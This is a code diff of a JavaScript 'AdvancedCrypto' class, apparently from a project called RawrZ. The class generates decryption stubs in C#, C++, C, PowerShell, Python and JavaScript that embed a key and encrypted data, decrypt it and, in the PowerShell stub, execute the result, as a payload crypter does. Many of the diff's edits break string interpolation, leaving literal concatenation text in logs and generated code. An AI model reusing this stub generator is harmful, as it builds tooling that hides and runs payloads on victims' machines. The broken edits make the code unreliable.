@@ -4,6 +4,19 @@ const { logger } = require('../utils/logger');
 const nativeCompiler = require('./native-compiler');
 
 class AdvancedCrypto {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor(options = {}) {
         // OpenSSL toggle - when true, only use OpenSSL-compatible algorithms
         this.useOpenSSL = options.useOpenSSL !== false; // Default to true
@@ -217,7 +230,7 @@ class AdvancedCrypto {
         const normalized = this.algorithmMap[algorithm.toLowerCase()];
         if (normalized) {
             if (process.env.DEBUG_CRYPTO === 'true') {
-                logger.info(`Algorithm normalized: ${algorithm} -> ${normalized}`);
+                logger.info(`Algorithm normalized: ${algorithm} -> normalized`);
             }
             return normalized;
         }
@@ -314,7 +327,7 @@ class AdvancedCrypto {
             // If OpenSSL mode is on and custom algorithms are disabled
             if (this.isCustomAlgorithm(algorithm)) {
                 const alternative = this.getOpenSSLAlternative(algorithm);
-                logger.warn(`Algorithm ${algorithm} not available in OpenSSL mode, using ${alternative} instead`);
+                logger.warn("Algorithm ${algorithm} not available in OpenSSL mode, using " + alternative + " instead");
                 return alternative;
             }
         }
@@ -725,7 +738,7 @@ class AdvancedCrypto {
                 throw new Error(`Unsupported algorithm: ${algorithm}`);
             }
         } catch (error) {
-            console.error(`[ERROR] Encryption failed with ${algorithm}:`, error.message);
+            console.error("[ERROR] Encryption failed with " + algorithm + ":", error.message);
             // Fallback to AES-256-CBC if algorithm fails
             try {
                 const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
@@ -1122,7 +1135,7 @@ class AdvancedCrypto {
     generateCSharpStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagDecl = authTag ? `string authTag = "${authTag}";` : '';
+        const authTagDecl = authTag ? "string authTag = `${authTag}`;" : '';
         const authTagBytes = authTag ? 'byte[] authTagBytes = Convert.FromHexString(authTag);' : '';
         const authTagParam = authTag ? ', byte[] authTag' : '';
         const authTagCall = authTag ? ', authTagBytes' : '';
@@ -1198,7 +1211,7 @@ namespace RawrZStub
     generateCppStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagDecl = authTag ? `std::string authTag = "${authTag}";` : '';
+        const authTagDecl = authTag ? "std::string authTag = `${authTag}`;" : '';
         
         return `#include <iostream>
 #include <string>
@@ -1231,7 +1244,7 @@ public:
 private:
     std::string decryptData(const std::string& encrypted) {
         // Decryption logic using OpenSSL
-        // Implementation depends on algorithm: ${algorithm}
+        // Implementation depends on algorithm: " + algorithm + "
         return "Decrypted content";
     }
     
@@ -1251,7 +1264,7 @@ int main() {
     generateCStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagDecl = authTag ? `const char* authTag = "${authTag}";` : '';
+        const authTagDecl = authTag ? "const char* authTag = `${authTag}`;" : '';
         
         return `#include <stdio.h>
 #include <stdlib.h>
@@ -1264,7 +1277,7 @@ int main(int argc, char *argv[]) {
     const char* encryptedData = "${options.encryptedData || 'ENCRYPTED_DATA'}";
     const char* key = "${key}";
     const char* iv = "${iv}";
-    ${authTagDecl}
+    " + authTagDecl + "
     
     // Decryption logic here
     printf("RawrZ C stub executed\\n");
@@ -1276,7 +1289,7 @@ int main(int argc, char *argv[]) {
     generatePowerShellStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagParam = authTag ? `,\n    [string]$AuthTag = "${authTag}"` : '';
+        const authTagParam = authTag ? ",\n    [string]$AuthTag = `${authTag}`" : '';
         const authTagParam2 = authTag ? ',\n        [string]$AuthTag' : '';
         const authTagCode = authTag ? '$authTagBytes = [System.Convert]::FromHexString($AuthTag)' : '';
         const authTagCall = authTag ? ' -AuthTag $AuthTag' : '';
@@ -1320,7 +1333,7 @@ function Execute-Content {
 
 # Main execution
 try {
-    $decrypted = Decrypt-Data -Encrypted $EncryptedData -Key $Key -IV $IV${authTagCall}
+    $decrypted = Decrypt-Data -Encrypted $EncryptedData -Key $Key -IV $IV" + authTagCall + "
     if ($decrypted) {
         Execute-Content -Content $decrypted
     }
@@ -1492,7 +1505,7 @@ int main(int argc, char *argv[])
     generatePythonStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagDecl = authTag ? `auth_tag = bytes.fromhex("${authTag}")` : '';
+        const authTagDecl = authTag ? "auth_tag = bytes.fromhex(`${authTag}`)" : '';
         const authTagParam = authTag ? ', auth_tag' : '';
         const authTagParam2 = authTag ? ', auth_tag' : '';
         
@@ -1527,7 +1540,7 @@ if __name__ == "__main__":
     generateJavaScriptStub(options) {
         const { algorithm, key, iv, authTag } = options;
         
-        const authTagDecl = authTag ? `const authTag = Buffer.from("${authTag}", 'hex');` : '';
+        const authTagDecl = authTag ? "const authTag = Buffer.from(`${authTag}`, 'hex');" : '';
         const authTagParam = authTag ? ', authTag' : '';
         const authTagParam2 = authTag ? ', authTag' : '';
         
@@ -1595,15 +1608,15 @@ main();`;
     getUnixStubInstructions(format) {
         return {
             compile: {
-                gcc: `gcc -o stub.${format} stub.c -lcrypto`,
-                clang: `clang -o stub.${format} stub.c -lcrypto`
+                gcc: "gcc -o stub." + format + " stub.c -lcrypto",
+                clang: "clang -o stub." + format + " stub.c -lcrypto"
             },
             requirements: [
                 "GCC or Clang compiler",
                 "OpenSSL development libraries"
             ],
             notes: [
-                `Generated as ${format} format`,
+                "Generated as " + format + " format",
                 "Ensure proper library linking"
             ]
         };
